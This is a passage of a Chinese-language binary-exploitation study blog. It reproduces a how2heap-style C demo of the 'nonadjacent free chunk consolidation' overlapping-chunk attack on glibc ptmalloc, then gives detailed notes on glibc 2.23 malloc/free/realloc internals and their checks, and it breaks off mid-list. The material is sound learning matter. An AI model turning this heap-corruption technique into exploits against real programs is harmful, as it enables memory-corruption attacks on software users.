<p>是一个比较简单的原理</p>
<h1 id="overlapping-chunks-2-c"><a href="#overlapping-chunks-2-c" class="headerlink" title="overlapping_chunks_2.c"></a>overlapping_chunks_2.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's start to allocate 5 chunks on the heap:"</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n\nchunk p1 from %p to %p"</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p2 from %p to %p"</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p"</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p4 from %p to %p"</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p5 from %p to %p\n"</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">'A'</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">'B'</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">'C'</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">'D'</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">'E'</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis operation will basically create a big free chunk that wrongly includes p3\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p6 from %p to %p"</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p\n"</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's write something inside p6\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">'F'</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nData inside chunk p3: \n\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码就是我前面写overlapchunk1用到的，通过溢出修改chunk的size字段，然后就可以在free时free出一大块chunk（不过此时要注意free的检查）一般是设置扩充的chunk刚好在某个chunk头部，当然如果chunk里面有合适的size也可以使用，这个我也暂时不debug了后面回来一起写总结</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/libc-2-23-malloc-free-realloc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/17/libc-2-23-malloc-free-realloc/" class="post-title-link" itemprop="url">libc-2.23-malloc,free,realloc</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-17 21:06:34" itemprop="dateCreated datePublished" datetime="2020-02-17T21:06:34+08:00">2020-02-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-04-17 09:04:20" itemprop="dateModified" datetime="2020-04-17T09:04:20+08:00">2020-04-17</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/17/libc-2-23-malloc-free-realloc/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/17/libc-2-23-malloc-free-realloc/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="int-malloc-mstate-av-size-t-bytes"><a href="#int-malloc-mstate-av-size-t-bytes" class="headerlink" title="_int_malloc(mstate av, size_t bytes)"></a>_int_malloc(mstate av, size_t bytes)</h1><ul>
<li>根据bytes参数计算要申请的chunk大小<code>nb</code></li>
<li>判断av是否为空，不为空跳过这一步，进入之后的流程<ul>
<li>直接通过nb和av用<code>sysmalloc</code>调用分配<ul>
<li>分配成功，<strong>返回</strong>分配区对应指针</li>
<li>分配失败，<strong>返回</strong>0</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="fastbin↓"><a href="#fastbin↓" class="headerlink" title="fastbin↓"></a>fastbin↓</h2><ul>
<li>调用<code>get_max_fast()</code>获得<code>global_max_fast</code>变量的值判断nb是否在fastchunk范围内，不是则略过这一步<ul>
<li>通过位移忽略nb低位来计算fastbin中的index，然后获取要分配的bin链头</li>
<li>判断链头是否为null，为null则<strong>跳出</strong>fastbin操作</li>
<li>否则从单链表取下该victim chunk<ul>
<li>判断<code>fastbin_index (chunksize (victim)) != idx</code>，如果该victim的index与本链不对应则<strong>报错结束</strong></li>
<li>指针转换<code>chunk2mem</code>，然后<strong>返回</strong>该指针</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="smallbin↓"><a href="#smallbin↓" class="headerlink" title="smallbin↓"></a>smallbin↓</h2><ul>
<li>判断nb是否&lt;MIN_LARGE_SIZE(Macro，非变量)<ul>
<li><strong>是：</strong></li>
<li>位移忽略nb低位来计算smallbin中的index，然后获取要分配的bin链头</li>
<li>如果bin链头的bk指向的不是自身则赋值bk给victim并进行以下操作，否则跳过（这里可以看出smallbin是从链尾开始取chunk的）<ul>
<li>如果判断victim为0则说明该arena需要初始化，调用<code>malloc_consolidate</code>，之后<strong>跳出</strong>该smallbin操作</li>
<li>不为0说明该bin链有chunk，获取victim-&gt;bk指针bck<ul>
<li><code>bck-&gt;fd != victim</code>，则<strong>报错结束</strong></li>
<li>这里说明成功分配，根据victim和nb设置相邻前向chunk的prev_inuse位为1,然后从双向链表取下victim chunk，设置size字段然后chunk2mem，<strong>返回</strong></li>
</ul>
</li>
</ul>
</li>
<li><strong>不是：</strong></li>
<li>位移忽略nb低位来计算对应largebin中的index</li>
<li>如果fastbin中有chunk(通过av的标识位判断)，调用<code>malloc_consolidate</code></li>
</ul>
</li>
</ul>
<h2 id="recently-freed-or-remaindered-chunks↓"><a href="#recently-freed-or-remaindered-chunks↓" class="headerlink" title="recently freed or remaindered chunks↓"></a>recently freed or remaindered chunks↓</h2><ul>
<li>大循环###########################################################################<ul>
<li>嵌套循环<strong>（由unsortedbin中是否有chunk和最大遍历chunk数决定次数）</strong>↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓<ul>
<li>如果unsortedbin头bk指针不为自身则赋值victim(同样是从链尾取chunk)，否则<strong>退出第二层循环</strong></li>
<li>获取victim chunk的bk指针bck</li>
<li>判断victim的size字段是否满足<code>2*size_t &lt; victim-&gt;size &lt;= system_mem</code>，不满足则<strong>报错结束</strong></li>
<li>如果满足<strong>(</strong>in_smallbin_range<strong>)(</strong>bck == unsorted_chunks ，即unsortedbin中只有一个chunk<strong>)(</strong>vicitm==last_remainder，即上次被切割的chunk<strong>)(</strong>size&gt;nb+MINSIZE，MINSIZE是能够分配的最小chunk<strong>)</strong>这四个条件则进行以下操作<strong>（这里只是为了从unsortedbin唯一chunk，而且还是last_remainder中切割出smallbin）</strong><ul>
<li>设置新的remainder，并链入unsortedbin        <strong>※</strong></li>
<li>如果remainder不是largebin需要将fd_nextsize和bk_nextsize清零</li>
<li>设置victim的size字段（prev_inuse默认为1）</li>
<li>设置remainder的size字段和更新前向chunk的prev_size字段</li>
<li>chunk2mem，<strong>返回</strong>切割下来的vicitm</li>
</ul>
</li>
<li>从unsorted chunk中取下该victim</li>
<li>如果该victim的<code>size==nb</code>进行以下操作否则略过<strong>（刚好碰到unsortedbin中相等大小的chunk）</strong><ul>
<li>设置victim前向chunk的prev_inuse为1</li>
<li>设置vicitm的size字段</li>
<li>chunk2mem，<strong>返回</strong>vicitm</li>
</ul>
</li>
<li>通过<code>in_smallbin_range</code>判断victim的size（<strong>这个操作是为了将不满足的chunk链入bin链，判断只是在small chunk和large chunk上做不同的工作而已）</strong><ul>
<li><strong>满足：</strong><ul>
<li>计算对应smallbin中的index</li>
</ul>
</li>
<li><strong>不满足：</strong><ul>
<li>说明是largechunk</li>
<li>找到largebin中对应的index和bin链中的位置</li>
</ul>
</li>
<li>在binmap设置对应的index为1，说明该bin链有chunk</li>
<li>将该chunk通过获得的fwd和bck链入bin链</li>
</ul>
</li>
<li>嵌套循环结尾↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑</li>
</ul>
</li>
<li>通过<code>in_smallbin_range</code>判断nb，不是则进行以下操作，是则跳过<strong>（这里是去largebin中对应的index切割出chunk来，small chunk和largebin中对应bin链没有chunk的还得等到下面binmap去找）</strong><ul>
<li>获取对应largebin中的bin链头作为victim</li>
<li>bin链中有chunk，并且victim的size大于等于nb则进行下一系列操作<ul>
<li>反向遍历chunk size链表，直到找到第一个大于等于所需chunk大小的chunk </li>
<li>如果从 large bin 链表中选取的 chunk victim 不是链表中的最后一个 chunk，并且与 victim大小相同的chunk不止一个，那么意味着victim为chunk size链表中的节点，为了不调整chunksize 链表，需要避免将 chunk size 链表中的节点取出，所以取 victim-&gt;fd 节点对应的 chunk作为候选 chunk。由于 large bin 链表中的 chunk 也是按大小排序，同一大小的 chunk 有多个时，这些 chunk 必定排在一起，所以 victim-&gt;fd 节点对应的 chunk 的大小必定与 victim 的大小一样（这段我直接复制的华庭，因为涉及largebin的概念太多了）</li>
<li>计算victim切割后的大小，并调用 unlink()宏函数将 victim 从 bin 链中取出      <strong>※※</strong></li>
<li>判断切割后的大小是否小于MINSIZE（判断返回chunk之前要不要切一下）<ul>
<li>是，切割失败，不用切了，设置victim前向chunk的prev_inuse为1并设置victimsize字段</li>
<li>否，切割成功，设置remainder<ul>
<li>检查unsortedbin链表头是否正常，不正常则<strong>报错结束</strong></li>
<li>重复将remainder链入unsortedbin中的操作（前面嵌套循环中打<strong>※</strong>处）</li>
</ul>
</li>
</ul>
</li>
<li>chunk2mem，<strong>返回victim</strong></li>
</ul>
</li>
</ul>
</li>
<li>到这里便开始使用binmap分配<strong>（largebin和smallbin中对应index都没有chunk的）</strong></li>
<li>获取我们需要大小chunk对应bin的下一个bin的空闲chunk链表，并获取该bin对于binmap中的bit位的值 （开始从稍大的chunk中寻找）</li>
<li>嵌套循环↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓<ul>
<li>首先找到对应的binmap中对应的block<strong>（找不到则直接去use_top）</strong>，然后找到block中的对应bit位和对应的bin链</li>
<li>判断此时 victim 与 bin 链表头是否相同<ul>
<li><strong>是：</strong>表示该 bin 中没有空闲 chunk， binmap 中的相应位<strong>设置不准确</strong>（接着找），将 binmap 的相应 bit 位清零， 获取当前 bin 下一个 bin，将 bit 移到下一个 bit位，回到前面循环↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑</li>
<li><strong>否：</strong>当前 bin 中的最后一个 chunk 满足要求<ul>
<li>重复之前打<strong>※※</strong>处操作</li>
</ul>
</li>
</ul>
</li>
<li>嵌套循环结尾↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑</li>
</ul>
</li>
<li>use_top:<ul>
<li>前面的全部都没找到则直接使用topchunk，获取topchunk的size</li>
<li>如果<code>size+MINSIZE&gt;nb</code>，则切出victim（此时不更改last_remainder），chunk2mem，<strong>返回victim</strong></li>
<li>如果top_chunk都不满足，判断此时是否有fastchunk<ul>
<li><strong>有</strong>：调用<code>malloc_consolidate</code>，并计算nb对应bin的index</li>
<li><strong>没有</strong>：重复之前调用sysmalloc的流程</li>
</ul>
</li>
</ul>
</li>
<li>###########################################################################</li>
</ul>
</li>
</ul>
<hr>
<p>Free就从封装函数开始吧</p>
<h1 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));		<span class="comment">//有hook就先调用hook，和其他函数一样</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect ，0直接return */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;<span class="built_in">size</span> &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;<span class="built_in">size</span> &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);<span class="comment">//如果是mmap分配的chunk就使用munmap，不调用_int_free，暂时不深究</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//一般的free流程</span></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="int-free-mstate-av-mchunkptr-p-int-have-lock"><a href="#int-free-mstate-av-mchunkptr-p-int-have-lock" class="headerlink" title="_int_free (mstate av, mchunkptr p, int have_lock)"></a>_int_free (mstate av, mchunkptr p, int have_lock)</h1><p>这里<code>have_lock</code>默认传入的是0</p>
<ul>
<li>先获取p的chunksize <code>size</code>，然后开始做检查</li>
<li>检查1：p不能大于-size，p需要对齐，否则<code>free(): invalid pointer</code>，<strong>报错结束</strong></li>
<li>检查2：size要大于MINSIZE，而且size要对齐，否则<code>free(): invalid size</code><strong>报错结束</strong></li>
</ul>
<p><strong>#下面的三个大块是if..else if..else…结构</strong></p>
<ul>
<li>通过<code>get_max_fast ()</code>获取<code>global_max_fast</code>变量判断是否为fastchunk，是则进行以下操作（如果存在宏TRIM_FASTBINS，靠近topchunk的fastbin不会进入该流程）<ul>
<li>检查该chunk相邻的前向chunk的大小是否合法(是否满足<code>2*size_t &lt; size &lt; system_men</code>)<ul>
<li>不合法则<code>free(): invalid next size (fast)</code><strong>报错结束</strong></li>
</ul>
</li>
<li><code>set_fastchunks(av)</code>，设置av中对应标识，代表此时有fastchunk了</li>
<li>将bin链上已存在的chunk赋值到old，检查old是否和本chunk相等<ul>
<li>相等则<code>double free or corruption (fasttop)</code><strong>报错结束</strong></li>
</ul>
</li>
<li><code>p-&gt;fd = old2 = old;</code>加入bin链，并存下old2为后续表头操作</li>
<li>接下来在有锁(have_lock=1)的条件下，保证表头指向的chunk所属的bin链与当前chunk所属的bin链相同<ul>
<li>不相同则<code>invalid fastbin entry (free)</code><strong>报错结束</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>这里，如果不是mmap分配的chunk则进行以下操作</p>
<ul>
<li><p>先加锁（free里面的锁操作好像很多）</p>
</li>
<li><p>根据p和size计算nextchunk</p>
</li>
<li><p>如果p是top_chunk则<code>double free or corruption (top)</code><strong>报错结束</strong></p>
</li>
<li><p>如果nextchunk 的地址已经超过了 top chunk 的结束地址，超过了当前分配区的结束地址，<code>double free or corruption (out)</code><strong>报错结束</strong></p>
</li>
<li><p>如果nextchunk的prev_inuse为0，又因为此时不是fastchunk。<code>double free or corruption (!prev)</code><strong>报错结束</strong></p>
</li>
<li><p>获取nextchunk的nextsize，如果nextsize不满足<code>2*size_t &lt; nextsize &lt; system_men</code>，<code>free(): invalid next size (normal)</code>，<strong>报错结束</strong>（这一步在前面fastbin中也做了） </p>
</li>
<li><p>接着向后合并：</p>
<ul>
<li><pre><code class="c"><span class="keyword">if</span> (!prev_inuse(p)) {<span class="comment">//通过prev_inuse判断如果相邻的后向chunk不在使用态</span>
      prevsize = p-&gt;prev_size;<span class="comment">//通过本chunk的prev_size段获取prevsize</span>
      <span class="built_in">size</span> += prevsize;
      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));<span class="comment">//更新p到prevchunk</span>
      unlink(av, p, bck, fwd);<span class="comment">//对prevchunk进行unlink</span>
    }<span class="comment">//此处prev_size字段为0会怎么样？prev_size为负数会怎么样?修改偏移来实现任意unlink？</span>
&lt;!--￼<span class="number">1</span>--&gt;</code></pre>
</li>
<li><p>检查unsortedbin中表头指针是否正常，不正常则<code>free(): corrupted unsorted chunks</code><strong>报错结束</strong></p>
</li>
<li><p>如果size属于largebin，则将fd_nextsize，bk_nextsize置零</p>
</li>
<li><p>将p加入unsortedbin头并设置size字段prev_inuse为1，并设置相邻前向chunk的prev_size为size</p>
</li>
<li><p><strong>是</strong></p>
</li>
<li><p>直接链入topchunk，设置size字段prev_inuse为1</p>
</li>
</ul>
</li>
<li><p>如果当前分配区为主分配区，并且 top chunk 的大小大于 heap 的收缩阈值，调用 systrim()函数收缩 heap，不是主分配区的话，调用 heap_trim()函数收缩非主分配区的 sub_heap </p>
</li>
</ul>
</li>
</ul>
<ul>
<li>这里说明是mmap分配的区域，调用<code>munmap</code></li>
</ul>
<hr>
<p><code>_int_realloc</code>之前先做检查，如果传入的指针为NULL，就直接调用<code>_int_malloc</code></p>
<p>如果传入的chunk不满足<code>(uintptr_t) oldp &gt; (uintptr_t) -oldsize</code>，且也不是16bit对齐，<strong>报错结束</strong></p>
<h1 id="int-realloc-mstate-av-mchunkptr-oldp-INTERNAL-SIZE-T-oldsize-INTERNAL-SIZE-T-nb"><a href="#int-realloc-mstate-av-mchunkptr-oldp-INTERNAL-SIZE-T-oldsize-INTERNAL-SIZE-T-nb" class="headerlink" title="_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb)"></a>_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb)</h1><p>检查oldp的size字段是否满足<code>2*size_t &lt; oldp.size &lt; system_mem</code>，不满足则<strong>报错结束</strong></p>
<p>oldchunk不能是mmapped，否则<strong>报错结束</strong></p>
<p>通过oldp和oldsize计算next和next size</p>
<p>检查next的size字段是否满足<code>2*size_t &lt; oldp.size &lt; system_mem</code>，不满足则<strong>报错结束</strong></p>
<p>（下面开始if..else..流程）</p>
<ul>
<li>oldsize&gt;=nb？</li>
<li><strong>是</strong>：<ul>
<li>则准备从原chunk切割</li>
<li>newp=oldp，newsize=oldsize</li>
</ul>
</li>
<li><strong>否</strong>：(newsize=oldsize+nextsize)<ul>
<li>如果前向chunk是topchunk且<code>oldsize+topsize&gt;nb+MINSIZE</code><ul>
<li>直接从topchunk切割出一部分补上去，设置新tophead，chunk2mem(oldp)，<strong>完成退出</strong></li>
</ul>
</li>
<li>如果前向chunk不是topchunk且未使用，并满足<code>oldsize+nextsize&gt;nb+MINSIZE</code><ul>
<li>newp=oldp</li>
<li>unlink前向chunk</li>
</ul>
</li>
<li>前面两种情况都不是，则进行以下操作<ul>
<li>调用<code>_int_malloc(av, nb - MALLOC_ALIGN_MASK)</code>，分配内存，这里nb - MALLOC_ALIGN_MASK是因为在<code>_int_malloc</code>里面还会再计算一遍nb。然后计算newp和newsize</li>
<li>newp == next？</li>
<li><strong>是</strong>：<ul>
<li>直接设置newp=oldp，不用复制内容了，扩充就好</li>
</ul>
</li>
<li><strong>否</strong>：<ul>
